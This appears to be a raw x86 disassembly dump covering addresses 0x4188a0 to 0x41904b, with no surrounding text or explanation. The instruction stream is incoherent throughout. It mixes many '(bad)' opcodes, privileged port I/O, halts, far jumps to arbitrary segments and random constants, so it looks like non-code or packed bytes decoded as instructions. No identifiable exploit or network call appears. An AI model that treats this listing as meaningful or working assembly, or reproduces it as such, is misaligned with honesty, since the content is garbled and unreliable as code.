  4188a0:	shr    edx,0x3c
  4188a3:	sbb    eax,edi
  4188a5:	mov    BYTE PTR [ebx-0x65],0xba
  4188a9:	pop    ecx
  4188aa:	sub    al,BYTE PTR [esi-0x2c]
  4188ad:	pop    eax
  4188ae:	add    dl,dl
  4188b0:	jge    0x418913
  4188b2:	push   cs
  4188b3:	and    esi,esi
  4188b5:	out    dx,al
  4188b6:	xchg   ebp,eax
  4188b7:	(bad)
  4188ba:	test   DWORD PTR [eax-0x6a],0x453ba562
  4188c1:	imul   ebp,DWORD PTR [esi+edi*2+0x21],0x307d0b7
  4188c9:	fcmovne st,st(7)
  4188cb:	jle    0x418888
  4188cd:	mov    dh,0xfc
  4188cf:	sahf   
  4188d0:	(bad)  
  4188d1:	in     al,dx
  4188d2:	jb     0x418882
  4188d4:	jmp    0xdb9d:0xda623f85
  4188db:	mov    edi,0x3370a569
  4188e0:	in     eax,dx
  4188e1:	ds dec edi
  4188e3:	icebp  
  4188e4:	mov    dh,0x25
  4188e6:	add    eax,esp
  4188e8:	jnp    0x4188dd
  4188ea:	or     ah,BYTE PTR [ecx]
  4188ec:	cmp    al,0x29
  4188ee:	mov    esp,0x13779c5b
  4188f3:	pop    esi
  4188f4:	or     al,0xb4
  4188f6:	pop    ss
  4188f7:	(bad)  
  4188f8:	pop    ebx
  4188f9:	test   DWORD PTR [edi-0x12],esp
  4188fc:	mov    ebx,0xda999df4
  418901:	repz test ah,al
  418904:	mov    ds:0x78d4e831,al
  418909:	hlt    
  41890a:	pushf  
  41890b:	nop
  41890c:	sbb    esp,DWORD PTR [esi]
  41890e:	mov    ds:0xef8e79c7,eax
  418913:	or     BYTE PTR [edi],dl
  418915:	retf   
  418916:	add    al,0xe1
  418918:	xor    eax,0x3093bb53
  41891d:	ss xor al,0xdd
  418920:	(bad)
  418923:	call   0xa83b:0xe28c3ac3
  41892a:	sbb    bl,BYTE PTR [esi-0x41]
  41892d:	sti    
  41892e:	cld    
  41892f:	mov    ?,eax
  418931:	rcl    DWORD PTR [ecx],cl
  418933:	cmp    eax,0x2789bf90
  418938:	hlt    
  418939:	adc    DWORD PTR [edx],ecx
  41893b:	int    0xfa
  41893d:	mov    esp,0xe08f2f32
  418942:	push   ss
  418943:	inc    edx
  418944:	pop    edi
  418945:	mov    esp,0xf4599895
  41894a:	int3   
  41894b:	lock in eax,0x90
  41894e:	ficom  WORD PTR [eax]
  418950:	(bad)  
  418951:	jnp    0x418939
  418953:	jp     0x41898a
  418955:	fistp  DWORD PTR [edx]
  418957:	push   esi
  418958:	iret   
  418959:	and    BYTE PTR [ebx+0x3b4bf457],bl
  41895f:	fisubr DWORD PTR [esp+ecx*1-0x73f098b1]
  418966:	cmp    eax,0x5767d892
  41896b:	adc    al,0x58
  41896d:	mov    dx,0x7c9d
  418971:	inc    esi
  418972:	sbb    ebp,edi
  418974:	outs   dx,BYTE PTR ds:[esi]
  418975:	jmp    FWORD PTR [ebx+0x4a]
  418978:	adc    edx,ecx
  41897a:	dec    ebp
  41897b:	mov    ebx,0xd1fb74f2
  418980:	and    ecx,DWORD PTR [esi-0x4c606ddf]
  418986:	push   es
  418987:	dec    esp
  418988:	(bad)  
  41898a:	cmp    al,0xa8
  41898c:	hlt    
  41898d:	cmc    
  41898e:	das    
  41898f:	ds ret 0xe4b4
  418993:	dec    ecx
  418994:	sbb    eax,0x15cb3987
  418999:	or     cl,bl
  41899b:	jl     0x4189c8
  41899d:	mov    edx,0xb2b8161
  4189a2:	jnp    0x41893a
  4189a4:	mov    eax,0xc88562a9
  4189a9:	mov    ebx,0x5257985
  4189ae:	aad    0x5d
  4189b0:	ja     0x41899c
  4189b2:	dec    edi
  4189b3:	cmp    eax,0x57a2f169
  4189b8:	push   eax
  4189b9:	ret    0xd369
  4189bc:	ins    DWORD PTR es:[edi],dx
  4189bd:	xchg   edi,eax
  4189be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189bf:	push   ebp
  4189c0:	sahf   
  4189c1:	sbb    esi,eax
  4189c3:	retf   
  4189c4:	inc    ebx
  4189c5:	fnstsw WORD PTR ds:0xa0731c30
  4189cb:	or     BYTE PTR [edi+ecx*1+0x30],bh
  4189cf:	out    dx,eax
  4189d0:	out    dx,eax
  4189d1:	xchg   BYTE PTR [ebx+0x2e9b9f75],dh
  4189d7:	sbb    bh,BYTE PTR [edi-0x82eefb0]
  4189dd:	and    BYTE PTR [ebx],bl
  4189df:	or     BYTE PTR [ebx-0x7a],ch
  4189e2:	sub    BYTE PTR [ebp+0x22],0x64
  4189e6:	push   esp
  4189e7:	push   esi
  4189e8:	out    dx,eax
  4189e9:	test   esi,ebp
  4189eb:	dec    edx
  4189ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189ed:	test   al,0xfb
  4189ef:	jp     0x4189b6
  4189f1:	daa    
  4189f2:	dec    ebp
  4189f3:	ret    0x37c5
  4189f6:	inc    edx
  4189f7:	xchg   BYTE PTR [edx],ch
  4189f9:	or     eax,edx
  4189fb:	mov    ds:0xc9f77361,eax
  418a00:	mov    ebx,0x74ee5855
  418a05:	mov    esp,0xddad5765
  418a0a:	inc    edi
  418a0b:	adc    eax,DWORD PTR [ebx]
  418a0d:	(bad)  
  418a0e:	sbb    DWORD PTR [esi+ebp*1-0x63],esi
  418a12:	sub    al,dh
  418a14:	mov    eax,DWORD PTR ds:0xa7abca7
  418a1a:	nop
  418a1b:	repnz push ebp
  418a1d:	or     ecx,0xc458bb4
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	shl    DWORD PTR [ecx+edx*1+0x611f3947],1
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	inc    ebx
  418a4b:	lods   eax,DWORD PTR ds:[esi]
  418a4c:	sbb    BYTE PTR [edi-0x51],al
  418a4f:	sub    dl,BYTE PTR [esi-0x7a]
  418a52:	rcr    DWORD PTR [edi-0x76c390cc],0x69
  418a59:	dec    esp
  418a5a:	mov    bl,0x2
  418a5c:	cld    
  418a5d:	jnp    0x4189f2
  418a5f:	push   ss
  418a60:	ja     0x418a74
  418a62:	xchg   ecx,eax
  418a63:	repnz aas 
  418a65:	(bad)  
  418a66:	or     eax,DWORD PTR [edi-0x65]
  418a69:	stos   DWORD PTR es:[edi],eax
  418a6a:	push   eax
  418a6b:	jp     0x418a5d
  418a6d:	lea    esi,[esi]
  418a6f:	test   bl,ah
  418a71:	add    ebx,0xbdd0df38
  418a77:	push   esp
  418a79:	cmc    
  418a7a:	push   edi
  418a7b:	iret   
  418a7c:	sahf   
  418a7d:	ss sub eax,0x96340223
  418a83:	jno    0x418a98
  418a85:	sbb    al,0x5f
  418a87:	push   edi
  418a88:	and    eax,0xaa02f7ff
  418a8d:	push   edi
  418a8e:	mov    ds:0x12300c4d,al
  418a93:	jo     0x418af6
  418a95:	scas   eax,DWORD PTR es:[edi]
  418a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a97:	enter  0x9ebc,0xf4
  418a9b:	sub    bl,cl
  418a9d:	cmp    ebx,DWORD PTR [eax-0x3feff7e3]
  418aa3:	(bad)  
  418aa4:	and    BYTE PTR [eax],0xe5
  418aa7:	std    
  418aa8:	mov    ebx,0xe2d7c339
  418aad:	and    edx,DWORD PTR [edx-0x4e]
  418ab0:	ror    BYTE PTR [edi-0x56f11025],cl
  418ab6:	out    0x37,eax
  418ab8:	xor    eax,edi
  418aba:	add    al,0x46
  418abc:	pop    ss
  418abd:	lods   eax,DWORD PTR ds:[esi]
  418abe:	add    eax,0xe5930806
  418ac3:	ins    BYTE PTR es:[edi],dx
  418ac4:	sbb    eax,0x3b6bfd53
  418ac9:	xchg   edi,esi
  418acb:	and    eax,0x16d7addc
  418ad0:	push   esp
  418ad1:	adc    ch,0xa6
  418ad4:	xchg   edi,eax
  418ad6:	xor    ah,BYTE PTR ds:0xd4a2c6dd
  418adc:	iret   
  418add:	cmp    al,0x65
  418adf:	das    
  418ae0:	fcomp  DWORD PTR [esi]
  418ae2:	fidivr DWORD PTR [eax+0x274ae2d9]
  418ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae9:	les    esp,FWORD PTR [ebp-0x1d]
  418aec:	or     ecx,DWORD PTR [ebx-0x100ff78c]
  418af2:	nop
  418af3:	retf   
  418af4:	stos   BYTE PTR es:[edi],al
  418af5:	adc    esp,esp
  418af7:	stos   BYTE PTR es:[edi],al
  418af8:	pop    ecx
  418af9:	clc    
  418afa:	xlat   BYTE PTR ds:[ebx]
  418afb:	popaw  
  418afd:	iret   
  418afe:	es push esi
  418b00:	pusha  
  418b01:	into   
  418b02:	xor    DWORD PTR [ecx],edx
  418b04:	sub    eax,edx
  418b06:	and    edi,edi
  418b08:	lahf   
  418b09:	xchg   edi,eax
  418b0a:	jae    0x418af1
  418b0c:	fs stos BYTE PTR es:[edi],al
  418b0e:	imul   edx,DWORD PTR ds:0x9cc310d2,0xb8190f22
  418b18:	ss xchg ax,ax
  418b1b:	pop    esp
  418b1c:	add    al,0x7b
  418b1e:	(bad)  [eax+edi*2-0x2f]
  418b22:	loopne 0x418b77
  418b24:	loope  0x418b96
  418b26:	rcr    DWORD PTR [ebx+0x3f],0xab
  418b2a:	sahf   
  418b2b:	out    dx,eax
  418b2c:	cwde   
  418b2d:	call   0x5f0c:0x37a0122e
  418b34:	jbe    0x418b19
  418b36:	pop    ebx
  418b37:	and    edi,ecx
  418b39:	int    0x11
  418b3b:	test   BYTE PTR [ebp+edi*8-0x5e],dl
  418b3f:	mov    dl,0xb2
  418b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b42:	jno    0x418b07
  418b44:	jae    0x418b02
  418b46:	push   es
  418b47:	ins    DWORD PTR es:[edi],dx
  418b48:	mov    al,0xc9
  418b4a:	add    BYTE PTR [eax],dh
  418b4c:	fisub  WORD PTR [edi]
  418b4e:	jne    0x418b5a
  418b50:	ret    0x10f1
  418b53:	js     0x418b7b
  418b55:	inc    ebx
  418b56:	ficomp DWORD PTR ss:[edx-0x74a44c00]
  418b5d:	aad    0x51
  418b5f:	mov    edi,0x80e139ab
  418b64:	sub    eax,0xdc7c37cf
  418b69:	pop    ebx
  418b6a:	fisubr WORD PTR [edi+eax*1]
  418b6d:	inc    ecx
  418b6e:	push   edi
  418b6f:	fs sahf 
  418b71:	lods   al,BYTE PTR ds:[esi]
  418b72:	mov    eax,0x19a3ead5
  418b77:	shl    DWORD PTR [eax+0x36aeddcf],1
  418b7d:	sbb    dl,bh
  418b7f:	jl     0x418bd1
  418b81:	mov    edx,0xc6b9172e
  418b86:	rol    ecx,1
  418b88:	mov    bl,0xfa
  418b8a:	and    edi,DWORD PTR [eax+0x4c07ab2b]
  418b90:	cwde   
  418b91:	push   0x63aac348
  418b96:	ficomp WORD PTR gs:[eax+0x6532b75e]
  418b9d:	sbb    al,0x2f
  418b9f:	call   0x618530a7
  418ba4:	nop    DWORD PTR [eax-0x26fa0779]
  418bab:	pop    edi
  418bac:	and    al,0xd
  418bae:	mov    ds:0x82475649,eax
  418bb3:	int    0xac
  418bb5:	sub    edi,DWORD PTR [ebx+0x2d]
  418bb8:	mov    al,ds:0xfdf75290
  418bbd:	(bad)  
  418bbe:	dec    ebx
  418bbf:	xchg   ecx,eax
  418bc0:	mov    edx,0xd09f186a
  418bc5:	es mov esi,edi
  418bc8:	sbb    dl,BYTE PTR [edi-0x3c]
  418bcb:	pop    ss
  418bcc:	pop    eax
  418bcd:	hlt    
  418bce:	xchg   DWORD PTR [ebx+0x5f7bf660],ecx
  418bd4:	xor    eax,0xb691cea5
  418bd9:	add    al,al
  418bdb:	daa    
  418bdc:	sbb    al,ah
  418bde:	xor    BYTE PTR [eax+0x6a5c2898],ch
  418be4:	mov    cl,0xe1
  418be6:	shl    dl,0x91
  418be9:	retf   
  418bea:	aaa    
  418beb:	cdq    
  418bec:	(bad)  
  418bed:	or     DWORD PTR [ebx-0x2eca69b],esp
  418bf3:	sahf   
  418bf4:	es js  0x418c59
  418bf7:	inc    esi
  418bf8:	push   ebx
  418bf9:	dec    ebx
  418bfa:	sbb    edi,DWORD PTR [eax-0x7bb8abd2]
  418c00:	jmp    0x2368:0x5127d33
  418c07:	retf   0x1988
  418c0a:	cmp    al,0x91
  418c0c:	jnp    0x418c42
  418c0e:	outs   dx,BYTE PTR ds:[esi]
  418c0f:	ret    0x8100
  418c12:	js     0x418c6e
  418c14:	cmp    esp,DWORD PTR [eax+0x6b]
  418c17:	xor    ebp,0xffffff87
  418c1a:	sub    eax,0x1a1ee65d
  418c1f:	adc    DWORD PTR [edx+0x44],0xfcbca1b4
  418c26:	daa    
  418c27:	shl    DWORD PTR [esi-0x4d773e3c],cl
  418c2d:	adc    ah,BYTE PTR [edx]
  418c2f:	int3   
  418c30:	push   edi
  418c31:	add    ebx,eax
  418c33:	adc    eax,0x5f18ba3f
  418c38:	inc    ebx
  418c39:	in     al,dx
  418c3a:	in     al,dx
  418c3b:	push   es
  418c3c:	mov    ebx,DWORD PTR [eax-0x37]
  418c3f:	xchg   esi,eax
  418c40:	dec    edx
  418c41:	stos   BYTE PTR es:[edi],al
  418c42:	ret    
  418c43:	xchg   ah,bl
  418c45:	dec    edx
  418c46:	sti    
  418c47:	fstp   QWORD PTR [esi+0x65e61e4e]
  418c4d:	push   0x63bc3515
  418c52:	outs   dx,DWORD PTR ds:[esi]
  418c53:	add    ebx,eax
  418c55:	leave  
  418c56:	aas    
  418c57:	sbb    eax,0x4ac5fd1b
  418c5c:	pushf  
  418c5d:	jecxz  0x418cde
  418c5f:	gs lea ebp,cs:[edi]
  418c63:	lds    ebp,FWORD PTR [eax-0x28cdba5b]
  418c69:	push   esp
  418c6a:	or     DWORD PTR [ebx-0x69],eax
  418c6d:	or     BYTE PTR [eax+0x4e70cd6],ch
  418c73:	icebp  
  418c74:	mov    dl,BYTE PTR [ebp-0x45]
  418c77:	cmp    ebp,DWORD PTR [ecx+eiz*1-0x3b]
  418c7b:	fadd   QWORD PTR [ebx-0x39644535]
  418c81:	lahf   
  418c82:	rcl    DWORD PTR [esi+ebx*1-0x3f],cl
  418c86:	out    0xcc,al
  418c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c89:	xchg   ebx,eax
  418c8a:	(bad)  
  418c8b:	dec    edi
  418c8c:	div    edi
  418c8e:	sbb    ah,BYTE PTR [ebp+0x4e]
  418c91:	rcr    DWORD PTR [ebx],1
  418c93:	mov    DWORD PTR [ebp+ecx*4+0x47],eax
  418c97:	gs dec ecx
  418c99:	call   0x4078de0
  418c9e:	mov    al,0xb1
  418ca0:	sbb    al,0x1c
  418ca2:	or     cl,BYTE PTR [ebx-0x4b]
  418ca5:	btc    DWORD PTR [esi+0x46025d99],ebx
  418cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cad:	cs pop eax
  418caf:	sti    
  418cb0:	pop    esi
  418cb1:	and    dl,BYTE PTR [ebx-0x5e]
  418cb4:	es scas eax,DWORD PTR es:[edi]
  418cb6:	ins    BYTE PTR es:[edi],dx
  418cb7:	mov    dh,0x7
  418cb9:	pop    edi
  418cba:	dec    edx
  418cbb:	sub    edi,DWORD PTR [eax]
  418cbd:	loopne 0x418d1d
  418cbf:	(bad)  
  418cc0:	pop    ecx
  418cc1:	pop    esp
  418cc2:	mov    ecx,0x5601e0ad
  418cc8:	dec    eax
  418cc9:	or     cl,bl
  418ccb:	xchg   ecx,eax
  418ccc:	mov    fs,WORD PTR [ecx+0x5e2ee95c]
  418cd2:	(bad)  
  418cd3:	xor    ah,BYTE PTR [ebx+0x19e2371f]
  418cd9:	xor    ecx,DWORD PTR [ecx]
  418cdb:	add    eax,0xbd293695
  418ce0:	dec    edx
  418ce1:	bound  esp,QWORD PTR [ecx]
  418ce3:	out    dx,eax
  418ce4:	stc    
  418ce5:	out    dx,al
  418ce6:	in     eax,0x57
  418ce8:	adc    al,dh
  418cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ceb:	mov    ecx,0x6c15b334
  418cf0:	sub    eax,0xfd2bfcb9
  418cf5:	jnp    0x418cc6
  418cf7:	lea    edi,[edx-0x78]
  418cfa:	pop    ebp
  418cfb:	mov    al,0x49
  418cfd:	scas   eax,DWORD PTR es:[edi]
  418cfe:	sbb    esp,ecx
  418d00:	leave  
  418d01:	dec    edx
  418d02:	inc    ecx
  418d03:	mov    eax,0xc1486245
  418d08:	inc    eax
  418d09:	pop    esp
  418d0a:	xchg   esi,eax
  418d0b:	xor    eax,0x54c33d1a
  418d10:	dec    ebx
  418d11:	enter  0x9823,0xc5
  418d15:	xchg   edx,eax
  418d16:	inc    ebp
  418d17:	add    DWORD PTR [esi-0x6e],edx
  418d1a:	push   edi
  418d1b:	(bad)  
  418d1c:	push   edx
  418d1d:	inc    esp
  418d1e:	sub    DWORD PTR [ebx-0x2b],esp
  418d21:	mov    dh,0x43
  418d23:	sar    DWORD PTR [esp+eiz*4],cl
  418d26:	sub    al,0x77
  418d28:	fucomi st,st(6)
  418d2a:	mov    eax,0x7c3e8b1f
  418d2f:	cs inc esi
  418d31:	and    al,0x81
  418d33:	jle    0x418d65
  418d35:	pop    esp
  418d36:	xchg   esi,eax
  418d37:	jmp    0x418d8c
  418d39:	push   0xf24a03f3
  418d3e:	icebp  
  418d3f:	scas   al,BYTE PTR es:[edi]
  418d40:	mov    dh,0x45
  418d42:	outs   dx,DWORD PTR ds:[esi]
  418d43:	stc    
  418d44:	test   al,dl
  418d46:	jge    0x418d31
  418d48:	in     eax,dx
  418d49:	cmp    ecx,DWORD PTR ds:0xa7d58e4e
  418d4f:	out    0x12,eax
  418d51:	jae    0x418cfb
  418d53:	gs pop eax
  418d55:	jecxz  0x418d57
  418d57:	popf   
  418d58:	js     0x418d82
  418d5a:	sbb    al,0x3b
  418d5c:	outs   dx,DWORD PTR ds:[esi]
  418d5d:	lods   eax,DWORD PTR ds:[esi]
  418d5e:	dec    eax
  418d5f:	imul   esi,edi,0xf56b81d8
  418d65:	pushw  ds
  418d67:	lea    edx,[ebp+0x572a7fa0]
  418d6d:	mov    gs,WORD PTR [esi+eiz*4+0xe]
  418d71:	cmp    BYTE PTR [ecx+0x61],0xad
  418d75:	mov    edx,0x52f0f0ea
  418d7a:	sub    ch,ah
  418d7c:	pop    ds
  418d7d:	jbe    0x418d85
  418d7f:	pop    edi
  418d80:	jns    0x418d83
  418d82:	outs   dx,BYTE PTR ds:[esi]
  418d83:	popf   
  418d84:	sbb    BYTE PTR [edx],bh
  418d86:	jp     0x418dbf
  418d88:	pop    esi
  418d89:	xchg   esp,eax
  418d8a:	data16 outs dx,BYTE PTR ds:[esi]
  418d8c:	into   
  418d8d:	pop    edi
  418d8e:	pop    ds
  418d8f:	and    cl,ah
  418d91:	fiadd  DWORD PTR [ebp+0x799c8154]
  418d97:	add    BYTE PTR [edi],dl
  418d99:	inc    esi
  418d9a:	push   ecx
  418d9b:	sub    esp,DWORD PTR [eax+0x4f]
  418d9e:	push   DWORD PTR [ecx-0x1a]
  418da1:	in     eax,0x4d
  418da3:	js     0x418d72
  418da5:	inc    eax
  418da6:	into   
  418da7:	push   edi
  418da8:	inc    esi
  418da9:	clc    
  418daa:	or     BYTE PTR [eax-0xad2e093],dh
  418db0:	xchg   esp,eax
  418db1:	lea    ecx,[ecx-0x4024171]
  418db7:	fucomip st,st(7)
  418db9:	jmp    0xfa53:0xd875df6a
  418dc0:	xor    dh,BYTE PTR [ecx+0x25415a6b]
  418dc6:	add    ah,BYTE PTR [ecx+0x73]
  418dc9:	aaa    
  418dca:	or     edi,DWORD PTR [eax-0x75]
  418dcd:	loope  0x418e04
  418dcf:	test   al,ah
  418dd1:	pop    edi
  418dd2:	or     BYTE PTR [ebx+0x7a],dh
  418dd5:	jg     0x418db0
  418dd7:	loopne 0x418d81
  418dd9:	sbb    DWORD PTR [esp+esi*1],esi
  418ddc:	out    dx,eax
  418ddd:	(bad)  
  418dde:	and    BYTE PTR [edi+0x0],dh
  418de1:	fnop   
  418de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de4:	mov    WORD PTR [edi+0x5cefe607],?
  418dea:	cmp    ebp,eax
  418dec:	jbe    0x418e46
  418dee:	ret    
  418def:	jp     0x418dc0
  418df1:	adc    ecx,ebp
  418df3:	enter  0x4cf4,0xfe
  418df7:	xor    al,0x52
  418df9:	and    edx,ebp
  418dfb:	xchg   ecx,eax
  418dfc:	mov    eax,0x8daddf57
  418e01:	mov    edi,0x7c8bef3f
  418e06:	sub    al,0x75
  418e08:	jle    0x418dc7
  418e0a:	add    al,BYTE PTR [ebx+0x52324cb7]
  418e10:	adc    al,0x74
  418e12:	add    eax,0x5fd1c0da
  418e17:	fstp   TBYTE PTR [edx-0x21]
  418e1a:	ins    DWORD PTR es:[edi],dx
  418e1b:	rcr    DWORD PTR [ecx],0x5a
  418e1e:	(bad)  
  418e1f:	sti    
  418e20:	aam    0x61
  418e22:	dec    ebx
  418e23:	(bad)  
  418e25:	jns    0x418e77
  418e27:	or     dh,al
  418e29:	not    DWORD PTR [eax+esi*4+0x41]
  418e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2f:	jmp    0x418e1e
  418e31:	scas   al,BYTE PTR es:[edi]
  418e32:	mov    cl,0x88
  418e34:	xor    cl,BYTE PTR [ebx-0x7f582c69]
  418e3a:	sbb    DWORD PTR [esi+esi*1+0x411aa162],esp
  418e41:	mov    DWORD PTR ds:0x342197a0,eax
  418e47:	retf   0xa5a
  418e4a:	and    al,0xad
  418e4c:	lock dec edx
  418e4e:	jp     0x418e6f
  418e50:	xor    bh,BYTE PTR [ebx+0x72]
  418e53:	scas   al,BYTE PTR es:[edi]
  418e54:	cmp    DWORD PTR [esi-0x5b12051],eax
  418e5a:	mov    bl,0x5f
  418e5c:	push   0x66
  418e5e:	sbb    eax,0xed51a46e
  418e63:	int    0xfd
  418e65:	cmp    al,0xc3
  418e67:	shl    BYTE PTR [edi+0x1b],1
  418e6a:	xchg   BYTE PTR [esi+0x26],ch
  418e6d:	test   edx,ebx
  418e6f:	and    DWORD PTR [ebp+0x76],edx
  418e72:	shl    BYTE PTR [ebp+0x4a701ccd],cl
  418e78:	pusha  
  418e79:	dec    edx
  418e7a:	pop    edi
  418e7b:	add    al,0x7f
  418e7d:	aas    
  418e7e:	mov    ebp,0x5b5c21da
  418e83:	test   DWORD PTR [edi+0x21],ebx
  418e86:	jecxz  0x418ed1
  418e88:	xchg   ebx,eax
  418e89:	sub    DWORD PTR [edx+edx*4],edi
  418e8c:	pop    ds
  418e8d:	dec    edx
  418e8e:	jp     0x418e8a
  418e90:	das    
  418e91:	ja     0x418eba
  418e93:	mov    al,ds:0x9933f6e8
  418e98:	int3   
  418e99:	mov    al,ds:0x314f3c72
  418e9e:	push   es
  418e9f:	dec    eax
  418ea0:	add    al,0x20
  418ea2:	cmp    BYTE PTR [edi+0x7a],dl
  418ea5:	rcl    DWORD PTR [edx+0x6a],cl
  418ea8:	mov    edi,0xd2db9f9c
  418ead:	fistp  DWORD PTR [ebp+0x19]
  418eb0:	stc    
  418eb1:	mov    ebp,0x52b054f7
  418eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eb7:	xlat   BYTE PTR ds:[ebx]
  418eb8:	ja     0x418e65
  418eba:	pusha  
  418ebb:	out    dx,eax
  418ebc:	cmp    BYTE PTR [ecx],dl
  418ebe:	fcmovbe st,st(7)
  418ec0:	(bad)  
  418ec1:	sub    al,BYTE PTR [ecx+0x4]
  418ec4:	pop    ebx
  418ec5:	dec    ecx
  418ec6:	jne    0x418f20
  418ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec9:	outs   dx,BYTE PTR ds:[esi]
  418eca:	or     eax,0xa8ca7b81
  418ecf:	rcr    dl,0xbd
  418ed2:	lahf   
  418ed3:	or     eax,0xd959b0ad
  418ed8:	add    cl,BYTE PTR fs:[esi+esi*1+0x6]
  418edd:	adc    al,0x1d
  418edf:	xor    edx,DWORD PTR [edx+0x6d56cc02]
  418ee5:	fmul   DWORD PTR ds:0x1adf6cb1
  418eeb:	pop    ebp
  418eec:	sbb    eax,0x2fe9316b
  418ef1:	dec    eax
  418ef2:	pop    edx
  418ef3:	data16 gs cmp al,0x56
  418ef7:	les    ebp,FWORD PTR [edi-0x1f56f57a]
  418efd:	lahf   
  418efe:	aaa    
  418eff:	or     BYTE PTR [ebx+0x4f],dl
  418f02:	and    BYTE PTR [ebp-0x20a6ab83],ah
  418f08:	cmp    al,0xbc
  418f0a:	add    cl,cl
  418f0c:	std    
  418f0d:	jl     0x418eec
  418f0f:	push   ebp
  418f10:	popa   
  418f11:	mov    ebx,0x4c5153f1
  418f16:	scas   al,BYTE PTR es:[edi]
  418f17:	xchg   ebp,eax
  418f18:	test   al,0xa7
  418f1a:	mov    fs,ebx
  418f1c:	cmp    eax,DWORD PTR [ebp+eax*4+0x191d922d]
  418f23:	mov    cl,BYTE PTR [edx]
  418f25:	mov    bl,0xf7
  418f27:	jl     0x418ef6
  418f29:	xchg   edx,eax
  418f2a:	fcomp  QWORD PTR [eax]
  418f2c:	pop    eax
  418f2d:	ss scas al,BYTE PTR es:[edi]
  418f2f:	pop    es
  418f30:	shr    bh,1
  418f32:	xchg   edx,eax
  418f33:	neg    dl
  418f35:	out    dx,al
  418f36:	sub    al,0x1f
  418f38:	mov    edi,0x445062fe
  418f3d:	ds sbb dh,ah
  418f40:	or     ebx,DWORD PTR [edx+eax*8+0x1977de68]
  418f47:	sbb    dh,0xe9
  418f4a:	inc    edx
  418f4b:	aad    0x63
  418f4d:	out    dx,al
  418f4e:	icebp  
  418f4f:	loop   0x418f89
  418f51:	fcmovu st,st(7)
  418f53:	ds aas 
  418f55:	or     ah,bh
  418f57:	aam    0x89
  418f59:	push   eax
  418f5a:	xor    esp,DWORD PTR [ebp+0x76]
  418f5d:	adc    DWORD PTR [esi-0x68],ebx
  418f60:	fistp  QWORD PTR [eax+ebp*4+0x474a8186]
  418f67:	adc    BYTE PTR [ebp-0x8af4bc0],0x7a
  418f6e:	and    BYTE PTR [ecx],dh
  418f70:	imul   esi,ecx,0xc4940ba5
  418f76:	fstp   QWORD PTR [edx]
  418f78:	jns    0x418f8d
  418f7a:	mov    edi,0x99652493
  418f7f:	rcl    ecx,1
  418f81:	pop    es
  418f82:	(bad)  
  418f83:	push   edx
  418f84:	arpl   WORD PTR [eax-0x4c],sp
  418f87:	leave  
  418f88:	mov    al,ds:0x1436ee4e
  418f8d:	sbb    eax,0xc76b1cc0
  418f92:	arpl   bx,sp
  418f94:	push   ss
  418f95:	mov    bh,0x80
  418f97:	pop    ecx
  418f98:	jp     0x418fed
  418f9a:	adc    al,0x86
  418f9c:	inc    ecx
  418f9d:	in     eax,dx
  418f9e:	ds mov ebp,0xbdf90c42
  418fa4:	mov    eax,0x5611864d
  418fa9:	jle    0x418fe7
  418fab:	xchg   edi,eax
  418fac:	adc    BYTE PTR [ebx+0x17ced4ba],al
  418fb2:	aaa    
  418fb3:	test   al,0xd1
  418fb5:	call   0xb8bafdf4
  418fba:	aad    0x75
  418fbc:	out    dx,eax
  418fbd:	or     ebx,DWORD PTR [esp+ecx*8]
  418fc0:	sti    
  418fc1:	mov    ebp,ds
  418fc3:	outs   dx,BYTE PTR ds:[esi]
  418fc4:	mov    al,0x53
  418fc6:	imul   DWORD PTR [ebx]
  418fc8:	or     ebp,eax
  418fca:	jmp    0x1efd:0x27f811ac
  418fd1:	or     esi,DWORD PTR [esi+0x4b]
  418fd4:	inc    ebx
  418fd5:	js     0x418ff0
  418fd7:	(bad)  
  418fd8:	push   ebp
  418fd9:	inc    DWORD PTR [ebp-0x27e599e0]
  418fdf:	lahf   
  418fe0:	mov    ds:0x550bf677,al
  418fe5:	dec    esp
  418fe6:	stc    
  418fe7:	sub    bl,bl
  418fe9:	pop    ebx
  418fea:	out    dx,eax
  418feb:	push   ebx
  418fec:	inc    ecx
  418fed:	xlat   BYTE PTR ds:[ebx]
  418fee:	cwde   
  418fef:	rcr    DWORD PTR [edi+0x12],1
  418ff2:	sub    cl,BYTE PTR [ebx-0x562c253f]
  418ff8:	inc    esp
  418ff9:	fistp  QWORD PTR ds:0xbc8bb0fc
  418fff:	or     al,0x79
  419001:	pop    ecx
  419002:	dec    ecx
  419003:	sub    BYTE PTR [eax+0x29],cl
  419006:	jne    0x418f8c
  419008:	inc    esi
  419009:	mov    edx,0x75351009
  41900e:	leave  
  41900f:	or     DWORD PTR [eax+0x1f4b41d1],ecx
  419015:	(bad)  
  419016:	js     0x41900f
  419018:	xor    bh,BYTE PTR [ebx+0x18]
  41901b:	or     eax,0x6671c28c
  419020:	push   ecx
  419021:	sub    esi,DWORD PTR [ebp-0x624d53b1]
  419027:	mov    ds:0xbfd3689d,al
  41902c:	es sti 
  41902e:	or     eax,0x37e691be
  419033:	sti    
  419034:	imul   esp,edi,0xffffffab
  419037:	and    DWORD PTR [ebp-0x35],esp
  41903a:	jge    0x418fd8
  41903c:	inc    ebx
  41903d:	test   ch,al
  41903f:	nop
  419040:	call   0x23af:0x9c5c2f9
  419047:	xor    al,0xc4
  419049:	pop    ebx
  41904a:	cwde   
  41904b:	jecxz  0x419093
